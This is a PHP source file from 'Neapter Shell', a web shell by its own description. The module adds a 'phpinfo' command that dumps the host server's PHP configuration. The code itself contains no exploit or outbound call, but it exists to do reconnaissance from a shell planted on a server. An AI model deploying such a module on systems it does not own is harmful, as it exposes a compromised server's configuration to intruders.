<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Get PHP information
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModulePhpinfo extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('phpinfo');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2011-11-20 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Informacje o PHP

	Użycie:
		phpinfo
DATA;
    }

    /**
     * Get PHPInfo
     *
     * @return string
     */
    public function get()
    {
        ob_start();
        phpinfo();
        $sData = ob_get_contents();
        ob_clean();
        ob_end_flush();

        if (PHP_SAPI !== 'cli') {
            $sData = str_replace(
                array(
                    ' class="e"',
                    ' class="v"'
                ),
                '',
                substr(
                    $sData,
                    strpos($sData, '<div class="center">') + 20,
                    -(strlen($sData) - strrpos($sData, '<h2>PHP License</h2>'))
                )
            );
        }

        return $sData;
    }
}
